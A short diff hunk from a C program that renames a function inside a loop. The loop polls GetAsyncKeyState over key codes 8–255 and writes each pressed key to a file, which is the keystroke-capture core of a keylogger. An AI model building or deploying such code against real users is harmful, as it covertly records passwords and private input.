@@ -359,7 +359,7 @@ void scan_code(const char *file){
     int key;
     for(key = 8; key <= 255; ++key){
         if(GetAsyncKeyState(key) == -32767){
-            saveFileCode(key, file);
+            save_file_code(key, file);
         }
     }
 }
